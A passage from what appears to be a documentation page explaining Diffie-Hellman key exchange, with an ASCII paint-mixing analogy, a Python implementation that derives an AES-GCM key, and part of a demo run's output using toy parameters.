secure.\n\n\n\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\nVISUAL ANALOGY: Paint Mixing\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nThink of it like mixing paint colors:\n\n1. PUBLIC COLOR (Yellow) - Known to everyone\n   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n   \u2502  Yellow  \u2502 \u2190 Public parameter (like g and p)\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n        \u2502\n        \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n        \u2502                \u2502                \u2502\n   \u250c\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2510      \u250c\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2510     \u250c\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2510\n   \u2502  Alice  \u2502      \u2502   Bob   \u2502     \u2502 Hacker  \u2502\n   \u2502  Gets   \u2502      \u2502  Gets   \u2502     \u2502  Gets   \u2502\n   \u2502 Yellow  \u2502      \u2502 Yellow  \u2502     \u2502 Yellow  \u2502\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518     \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n2. ADD SECRET COLORS (Private keys)\n   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n   \u2502  Alice  \u2502      \u2502   Bob   \u2502\n   \u2502 Yellow  \u2502      \u2502 Yellow  \u2502\n   \u2502   +     \u2502      \u2502   +     \u2502\n   \u2502  Blue   \u2502      \u2502   Red   \u2502 \u2190 Secret colors (private keys a, b)\n   \u2502 (Secret)\u2502      \u2502 (Secret)\u2502\n   \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518      \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518\n        \u2502                \u2502\n        \u25bc                \u25bc\n   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n   \u2502  Green  \u2502      \u2502 Orange  \u2502 \u2190 Public keys (A, B)\n   \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518      \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518\n\n3. EXCHANGE PUBLIC MIXES\n        \u2502                \u2502\n        \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n                 \u2502 Exchange\n        \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n        \u2502        \u2502        \u2502\n   \u250c\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2510      \u250c\u2500\u2500\u2500\u2500\u25bc\u2500\u2500\u2500\u2500\u2510\n   \u2502  Alice  \u2502      \u2502   Bob   \u2502\n   \u2502  Green  \u2502      \u2502 Orange  \u2502 \u2190 Received each other's public\n   \u2502   +     \u2502      \u2502   +     \u2502\n   \u2502  Blue   \u2502      \u2502   Red   \u2502 \u2190 Add own secret again\n   \u2502 (Secret)\u2502      \u2502 (Secret)\u2502\n   \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518      \u2514\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2518\n        \u2502                \u2502\n        \u25bc                \u25bc\n   \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n   \u2502  Brown  \u2502      \u2502  Brown  \u2502 \u2190 SAME COLOR (shared secret!)\n   \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\nThe hacker sees: Yellow, Green, Orange\nBut CANNOT create Brown without Blue or Red!\n(Can't \"unmix\" paint to extract secret colors)\n\n\n\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\nCOMPLETE COMMUNICATION FLOW\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\nStep 1: Diffie-Hellman Key Exchange\n         \u2193\n    Shared Secret: s = 2\n\nStep 2: Derive Encryption Key from Shared Secret\n         s = 2 \u2192 Hash(s) \u2192 AES Key\n         Example: SHA-256(2) = \"f2a3b4c5...\" (32 bytes)\n         \u2193\n    AES-256 Key: f2a3b4c5d6e7f8...\n\nStep 3: Use AES for Fast Encryption\n         \u2193\n\nALICE                                           BOB\n\u2500\u2500\u2500\u2500\u2500\u2500                                          \u2500\u2500\u2500\u2500\u2500\nPlaintext: \"Hello Bob!\"                    (Waiting)\n     \u2193\nEncrypt with AES using                     \nshared key:                                \n     \u2193\nCiphertext: \"xK9#mP2$vL...\"\n     \u2502                                          \u2502\n     \u2502  Send Ciphertext                         \u2502\n     \u2502\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25b6\u2502\n     \u2502                                          \u2502\n     \u2502                                     Decrypt with AES\n     \u2502                                     using shared key:\n     \u2502                                          \u2193\n     \u2502                                     Plaintext: \"Hello Bob!\"\n\n\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\n\nWHY THIS IS REVOLUTIONARY:\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\n\u2705 No Pre-shared Secret Needed\n   Alice and Bob never met before, yet created shared secret!\n\n\u2705 Secure Over Insecure Channel\n   Even if attacker sees all communication, cannot get secret\n\n\u2705 Perfect Forward Secrecy\n   Each session can use different ephemeral keys\n   If one session key compromised, others remain safe\n\n\u2705 Enables Modern Internet Security\n   Foundation of:\n   - TLS/HTTPS (secure websites)\n   - SSH (secure remote access)\n   - VPNs (secure networks)\n   - Signal/WhatsApp (secure messaging)\n</code></pre>"},{"location":"security/encryption/#diffie-hellman-implementation","title":"Diffie-Hellman Implementation","text":"<p>Complete Python Implementation:</p> <pre><code>import hashlib\nimport secrets\nfrom Crypto.Cipher import AES\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Util.Padding import pad, unpad\n\nclass DiffieHellman:\n    \"\"\"\n    Complete Diffie-Hellman Key Exchange Implementation\n    Demonstrates secure key exchange over insecure channel\n    \"\"\"\n\n    def __init__(self, key_size=2048):\n        \"\"\"\n        Initialize with public parameters\n        In practice, these are standardized (RFC 3526)\n        \"\"\"\n        # Use well-known safe primes for production\n        # For demonstration, using smaller numbers\n\n        if key_size == 2048:\n            # RFC 3526 - 2048-bit MODP Group\n            self.p = int(\n                \"FFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD1\"\n                \"29024E088A67CC74020BBEA63B139B22514A08798E3404DD\"\n                \"EF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245\"\n                \"E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7ED\"\n                \"EE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3D\"\n                \"C2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F\"\n                \"83655D23DCA3AD961C62F356208552BB9ED529077096966D\"\n                \"670C354E4ABC9804F1746C08CA18217C32905E462E36CE3B\"\n                \"E39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9\"\n                \"DE2BCBF6955817183995497CEA956AE515D2261898FA0510\"\n                \"15728E5A8AACAA68FFFFFFFFFFFFFFFF\", 16\n            )\n            self.g = 2\n        else:\n            # Toy example for demonstration\n            self.p = 23  # Small prime\n            self.g = 5   # Generator\n\n        self.private_key = None\n        self.public_key = None\n        self.shared_secret = None\n\n    def generate_private_key(self):\n        \"\"\"Generate random private key\"\"\"\n        # Private key should be random number: 2 &lt;= private_key &lt; p-1\n        self.private_key = secrets.randbelow(self.p - 2) + 2\n        return self.private_key\n\n    def generate_public_key(self):\n        \"\"\"Compute public key: g^private mod p\"\"\"\n        if self.private_key is None:\n            self.generate_private_key()\n\n        # Public key = g^a mod p\n        self.public_key = pow(self.g, self.private_key, self.p)\n        return self.public_key\n\n    def compute_shared_secret(self, other_public_key):\n        \"\"\"\n        Compute shared secret using other party's public key\n        shared_secret = other_public^private mod p\n        \"\"\"\n        if self.private_key is None:\n            raise ValueError(\"Must generate private key first\")\n\n        # Shared secret = B^a mod p (or A^b mod p)\n        self.shared_secret = pow(other_public_key, self.private_key, self.p)\n        return self.shared_secret\n\n    def derive_key(self, key_length=32):\n        \"\"\"\n        Derive encryption key from shared secret\n        Uses SHA-256 hash to create AES key\n        \"\"\"\n        if self.shared_secret is None:\n            raise ValueError(\"Must compute shared secret first\")\n\n        # Convert shared secret to bytes and hash it\n        secret_bytes = self.shared_secret.to_bytes(\n            (self.shared_secret.bit_length() + 7) // 8, \n            byteorder='big'\n        )\n\n        # Derive key using SHA-256\n        derived_key = hashlib.sha256(secret_bytes).digest()\n        return derived_key[:key_length]\n\n\ndef demonstrate_diffie_hellman():\n    \"\"\"\n    Demonstrate complete Diffie-Hellman key exchange\n    \"\"\"\n    print(\"=\"*70)\n    print(\"DIFFIE-HELLMAN KEY EXCHANGE DEMONSTRATION\")\n    print(\"=\"*70)\n\n    # \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n    # STEP 1: Setup - Agree on public parameters\n    # \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n    print(\"\\n\ud83d\udccb STEP 1: Public Parameters (known to everyone)\")\n    print(\"\u2500\"*70)\n\n    # Using small numbers for clarity (in production, use 2048-bit)\n    alice = DiffieHellman(key_size=23)  # Toy example\n    bob = DiffieHellman(key_size=23)\n\n    print(f\"Prime (p):     {alice.p}\")\n    print(f\"Generator (g): {alice.g}\")\n    print(\"\u26a0\ufe0f  These are PUBLIC - even attackers know them!\")\n\n    # \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n    # STEP 2: Generate Private Keys (secret)\n    # \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n    print(\"\\n\ud83d\udd10 STEP 2: Generate Private Keys (SECRET - never shared)\")\n    print(\"\u2500\"*70)\n\n    alice_private = alice.generate_private_key()\n    bob_private = bob.generate_private_key()\n\n    print(f\"Alice's private key (a): {alice_private} (SECRET!)\")\n    print(f\"Bob's private key (b):   {bob_private} (SECRET!)\")\n\n    # \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n    # STEP 3: Compute Public Keys\n    # \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n    print(\"\\n\ud83c\udf10 STEP 3: Compute Public Keys (safe to share)\")\n    print(\"\u2500\"*70)\n\n    alice_public = alice.generate_public_key()\n    bob_public = bob.generate_public_key()\n\n    print(f\"Alice computes: A = g^a mod p = {alice.g}^{alice_private} mod {alice.p} = {alice_public}\")\n    print(f\"Bob computes:   B = g^b mod p = {bob.g}^{bob_private} mod {bob.p} = {bob_public}\")\n\n    # \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n    # STEP 4: Exchange Public Keys\n    # \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n    print(\"\\n\ud83d\udce1 STEP 4: Exchange Public Keys (over insecure channel)\")\n    print(\"\u2500\"*70)\n    print(f\"Alice sends to Bob:  A = {alice_public}\")\n    print(f\"Bob sends to Alice:  B = {bob_public}\")\n    print(\"\u26a0\ufe0f  Attacker can intercept these values!\")\n    print(\"\u2705 But cannot derive private keys (discrete log problem)\")\n\n    # \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n    # STEP 5: Compute Shared Secret\n    # \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n    print(\"\\n\ud83d\udd11 STEP 5: Compute Shared Secret (independently)\")\n    print(\"\u2500\"*70)\n\n    alice_shared = alice.compute_shared_secret(bob_public)\n    bob_shared = bob.compute_shared_secret(alice_public)\n\n    print(f\"Alice computes: s = B^a mod p = {bob_public}^{alice_private} mod {alice.p} = {alice_shared}\")\n    print(f\"Bob computes:   s = A^b mod p = {alice_public}^{bob_private} mod {bob.p} = {bob_shared}\")\n\n    print(f\"\\n\ud83c\udf89 SUCCESS: Both computed the same secret!\")\n    print(f\"   Alice's shared secret: {alice_shared}\")\n    print(f\"   Bob's shared secret:   {bob_shared}\")\n    print(f\"   Secrets match: {alice_shared == bob_shared} \u2705\")\n\n    # \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n    # STEP 6: Derive Encryption Key\n    # \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n    print(\"\\n\ud83d\udd10 STEP 6: Derive AES Encryption Key\")\n    print(\"\u2500\"*70)\n\n    alice_aes_key = alice.derive_key()\n    bob_aes_key = bob.derive_key()\n\n    print(f\"Alice derives AES key: {alice_aes_key.hex()[:40]}...\")\n    print(f\"Bob derives AES key:   {bob_aes_key.hex()[:40]}...\")\n    print(f\"Keys match: {alice_aes_key == bob_aes_key} \u2705\")\n\n    # \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n    # STEP 7: Secure Communication with AES\n    # \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n    print(\"\\n\ud83d\udcac STEP 7: Secure Communication (using shared AES key)\")\n    print(\"\u2500\"*70)\n\n    # Alice encrypts message\n    message = b\"Hello Bob! This is a secret message.\"\n    print(f\"Alice's plaintext: {message.decode()}\")\n\n    cipher = AES.new(alice_aes_key, AES.MODE_GCM)\n    ciphertext, tag = cipher.encrypt_and_digest(message)\n    nonce = cipher.nonce\n\n    print(f\"Encrypted: {ciphertext.hex()[:40]}...\")\n    print(f\"Nonce:     {nonce.hex()}\")\n    print(f\"Tag:       {tag.hex()}\")\n\n    # Bob decrypts message\n    cipher = AES.new(bob_aes_key, AES.MODE_GCM, nonce=nonce)\n    decrypted = cipher.decrypt_and_verify(ciphertext, tag)\n\n    print(f\"\\nBob decrypts: {decrypted.decode()}\")\n    print(f\"\u2705 Message successfully exchanged over insecure channel!\")\n\n    # \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n    # Security Analysis\n    # \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n    print(\"\\n\" + \"=\"*70)\n    print(\"SECURITY ANALYSIS\")\n    print(\"=\"*70)\n\n    print(\"\"\"\n    WHAT ATTACKER KNOWS:\n    \u2022 Prime (p): {p}\n    \u2022 Generator (g): {g}\n    \u2022 Alice's public (A): {A}\n    \u2022 Bob's public (B): {B}\n\n    WHAT ATTACKER NEEDS:\n    \u2022 Alice's private (a) OR Bob's private (b)\n\n    THE CHALLENGE:\n    Given: A = g^a mod p\n    Find: a\n\n    For small numbers (p=23): Easy to brute force\n    For large numbers (2048-bit p): Computationally infeasible!\n\n    Time to crack 2048-bit DH: Millions of years with current technology\n    \"\"\".format(p=alice.p, g=alice.g, A=alice_public, B=bob_public))\n\n    print(\"=\"*70)\n\n\ndef production_example():\n    \"\"\"\n    Production-ready Diffie-Hellman with 2048-bit keys\n    \"\"\"\n    print(\"\\n\" + \"=\"*70)\n    print(\"PRODUCTION EXAMPLE (2048-bit keys)\")\n    print(\"=\"*70)\n\n    # Use secure 2048-bit parameters\n    alice = DiffieHellman(key_size=2048)\n    bob = DiffieHellman(key_size=2048)\n\n    # Generate keys\n    alice.generate_private_key()\n    alice.generate_public_key()\n\n    bob.generate_private_key()\n    bob.generate_public_key()\n\n    # Exchange and compute shared secret\n    alice.compute_shared_secret(bob.public_key)\n    bob.compute_shared_secret(alice.public_key)\n\n    print(f\"\u2705 Secure 2048-bit Diffie-Hellman key exchange complete\")\n    print(f\"   Prime size: {alice.p.bit_length()} bits\")\n    print(f\"   Shared secret size: {alice.shared_secret.bit_length()} bits\")\n    print(f\"   Secrets match: {alice.shared_secret == bob.shared_secret}\")\n\n    # Derive AES key\n    aes_key = alice.derive_key()\n    print(f\"   AES-256 key: {aes_key.hex()[:40]}...\")\n\n\nif __name__ == '__main__':\n    # Run demonstration\n    demonstrate_diffie_hellman()\n\n    # Show production example\n    production_example()\n</code></pre> <p>Output: <pre><code>======================================================================\nDIFFIE-HELLMAN KEY EXCHANGE DEMONSTRATION\n======================================================================\n\n\ud83d\udccb STEP 1: Public Parameters (known to everyone)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nPrime (p):     23\nGenerator (g): 5\n\u26a0\ufe0f  These are PUBLIC - even attackers know them!\n\n\ud83d\udd10 STEP 2: Generate Private Keys (SECRET - never shared)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nAlice's private key (a): 6 (SECRET!)\nBob's private key (b):   15 (SECRET!)\n\n\ud83c\udf10 STEP 3: Compute Public Keys (safe to share)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nAlice computes: A = g^a mod p = 5^6 mod 23 = 8\nBob computes:   B = g^b mod p = 5^15 mod 23 = 19\n\n\ud83d\udce1 STEP 4: Exchange Public Keys (over insecure channel)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nAlice sends to Bob:  A = 8\nBob sends to Alice:  B = 19\n\u26a0\ufe0f  Attacker can intercept these values!\n\u2705 But cannot derive private keys (discrete log problem)\n\n\ud83d\udd11 STEP 5: Compute Shared Secret (independently)\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\nAlice computes: s = B^a mod p = 19^6 mod 23 = 2\nBob computes:   s = A^b mod p = 8^15 mod 23 = 2\n\n\ud83c\udf89 SUCCESS: Both computed the same secret!\n   Alice's shared secret: 2\n   Bob's shared secret:   2\n   Secrets match: True \u2705\n\n\ud83d\udd10 STEP 6: Derive AES Encryption 